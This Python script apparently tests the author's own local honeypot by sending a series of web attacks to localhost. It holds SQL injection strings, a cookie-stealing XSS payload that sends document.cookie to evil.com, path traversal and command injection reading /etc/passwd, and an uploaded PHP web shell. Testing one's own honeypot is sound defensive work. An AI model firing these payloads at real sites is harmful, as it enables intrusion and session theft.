import requests
import time
import os

BASE_URL = "http://localhost:8000"

attacks = [
    {
        "name": "SQL Injection on Login",
        "url": f"{BASE_URL}/login",
        "method": "POST",
        "data": {"username": "admin' OR '1'='1", "password": "password"}
    },
    {
        "name": "XSS Payload in Login",
        "url": f"{BASE_URL}/login",
        "method": "POST",
        "data": {"username": "admin", "password": "<script>alert('XSS')</script>"}
    },
    {
        "name": "Path Traversal on API",
        "url": f"{BASE_URL}/api/v1/user?file=../../../../etc/passwd",
        "method": "GET"
    },
    {
        "name": "Command Injection in API",
        "url": f"{BASE_URL}/api/v1/user?cmd=;cat /etc/passwd",
        "method": "GET"
    },
    {
        "name": "XSS in Contact Form",
        "url": f"{BASE_URL}/contact",
        "method": "POST",
        "data": {"name": "Hacker", "email": "test@test.com", "message": "<script>fetch('http://evil.com?c=' + document.cookie)</script>"}
    },
    {
        "name": "SQLi in Forgot Password",
        "url": f"{BASE_URL}/forgot-password",
        "method": "POST",
        "data": {"email": "admin@gsi.corp' OR '1'='1"}
    },
    {
        "name": "Brute Force Simulation",
        "url": f"{BASE_URL}/login",
        "method": "POST",
        "data": {"username": "admin", "password": "wrongpassword"}
    }
]

def run_simulations():
    print("🚀 Starting Honeypot Attack Simulation...")
    for attack in attacks:
        print(f"\n[+] Simulating: {attack['name']}")
        try:
            if attack["method"] == "POST":
                response = requests.post(attack["url"], data=attack["data"])
            else:
                response = requests.get(attack["url"])
            print(f"    Status Code: {response.status_code}")
        except Exception as e:
            print(f"    Error: {e}")
        time.sleep(1)

    # File upload simulation
    print("\n[+] Simulating Malicious File Upload (PHP Web Shell)")
    file_content = b"<?php system($_GET['cmd']); ?>"
    with open("tmp_shell.php", "wb") as f:
        f.write(file_content)
    
    try:
        files = {'file': ('shell.php', open('tmp_shell.php', 'rb'), 'application/x-php')}
        response = requests.post(f"{BASE_URL}/upload", files=files)
        print(f"    Status Code: {response.status_code}")
        print(f"    Response: {response.json()}")
    except Exception as e:
        print(f"    Error: {e}")
    finally:
        if os.path.exists("tmp_shell.php"):
            os.remove("tmp_shell.php")

    print("\n✅ Simulation complete. Check the Admin Dashboard at http://localhost:8000/admin")

if __name__ == "__main__":
    run_simulations()